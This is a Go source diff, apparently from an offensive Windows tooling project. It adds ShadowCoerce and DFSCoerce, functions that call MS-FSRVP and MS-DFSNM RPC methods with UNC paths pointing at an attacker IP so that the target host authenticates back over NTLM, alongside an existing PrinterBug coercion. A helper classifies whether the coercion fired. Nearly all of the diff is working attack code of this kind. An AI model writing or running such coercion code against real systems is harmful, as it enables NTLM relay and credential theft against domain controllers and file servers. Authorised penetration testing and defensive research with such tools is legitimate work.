@@ -8,7 +8,12 @@ import (
 	efsrfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0/functions"
 	spoolss "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0"
 	spoolssfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0/functions"
+	netdfs "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0"
+	netdfsfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0/functions"
+	fsrvp "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/a8e0653c-2744-4389-a61d-7373df8b2292/1.0"
+	fsrvpfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/a8e0653c-2744-4389-a61d-7373df8b2292/1.0/functions"
 	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
+	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
 	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
 	msrprn "github.com/TheManticoreProject/Manticore/windows/protocols/ms-rprn"
 
@@ -134,6 +139,69 @@ func PrinterBug(session *gofenrirsmb.Session, attackerIP string) (*CoerceResult,
 		return &CoerceResult{Pipe: spoolss.PipeName, Status: "not vulnerable / spooler disabled: " + errStr}, nil
 	}
 	return &CoerceResult{Pipe: spoolss.PipeName, Status: errStr}, callErr
+}
+
+// ShadowCoerce triggers NTLM coercion via MS-FSRVP (the File Server VSS Agent,
+// "ShadowCoerce"). It calls IsPathShadowCopied with a UNC path on \\attackerIP,
+// making the target authenticate back. Requires the File Server VSS Agent Service.
+func ShadowCoerce(session *gofenrirsmb.Session, attackerIP string) (*CoerceResult, error) {
+	rpc, err := bindPipe(session, fsrvp.PipeName, fsrvp.SyntaxID())
+	if err != nil {
+		return nil, err
+	}
+	defer rpc.Close()
+
+	unc := ndr.WSTR(fmt.Sprintf(`\\%s\share\`, attackerIP))
+	_, _, callErr := fsrvpfunctions.IsPathShadowCopied(rpc, unc)
+	return classifyCoercion(fsrvp.PipeName, callErr), nil
+}
+
+// DFSCoerce triggers NTLM coercion via MS-DFSNM (the DFS Namespace Management
+// service, "DFSCoerce"). It calls NetrDfsAddStdRoot with a server name pointing at
+// \\attackerIP, making the target authenticate back. Requires the DFS service (DCs).
+func DFSCoerce(session *gofenrirsmb.Session, attackerIP string) (*CoerceResult, error) {
+	rpc, err := bindPipe(session, netdfs.PipeName, netdfs.SyntaxID())
+	if err != nil {
+		return nil, err
+	}
+	defer rpc.Close()
+
+	callErr := netdfsfunctions.NetrDfsAddStdRoot(rpc, ndr.WSTR(`\\`+attackerIP), ndr.WSTR("share"), ndr.WSTR(""), 1)
+	return classifyCoercion(netdfs.PipeName, callErr), nil
+}
+
+// bindPipe opens IPC$, connects the named pipe and binds the given interface.
+func bindPipe(session *gofenrirsmb.Session, pipe string, sid syntax.SyntaxID) (*dcerpcclient.Client, error) {
+	if err := session.TreeConnect("IPC$"); err != nil {
+		return nil, fmt.Errorf("IPC$: %w", err)
+	}
+	transport, err := session.Client.RPCTransport(pipe)
+	if err != nil {
+		return nil, fmt.Errorf("open %s: %w", pipe, err)
+	}
+	rpc := dcerpcclient.NewClient(transport)
+	if err := rpc.Bind(sid); err != nil {
+		rpc.Close()
+		return nil, fmt.Errorf("%s bind: %w", pipe, err)
+	}
+	return rpc, nil
+}
+
+// classifyCoercion maps a coercion RPC call's error into a result: a clean Win32
+// status (incl. RPC_S_SERVER_UNAVAILABLE) means the server processed the call and
+// the coercion fired; a DCE/RPC fault means the vector is unavailable/patched.
+func classifyCoercion(pipe string, callErr error) *CoerceResult {
+	if callErr == nil {
+		return &CoerceResult{Triggered: true, Pipe: pipe, Status: "ERROR_SUCCESS"}
+	}
+	s := callErr.Error()
+	if isCleanWin32Error(s) || strings.Contains(s, "0x000006ba") || strings.Contains(s, "RPC_S_SERVER_UNAVAILABLE") {
+		return &CoerceResult{Triggered: true, Pipe: pipe, Status: s}
+	}
+	if strings.Contains(s, "DCE/RPC fault") || strings.Contains(s, "nca_s_fault") {
+		return &CoerceResult{Triggered: false, Pipe: pipe, Status: "not vulnerable / service unavailable: " + s}
+	}
+	return &CoerceResult{Triggered: false, Pipe: pipe, Status: s}
 }
 
 // isCleanWin32Error returns true when the error is a Win32 status code from the
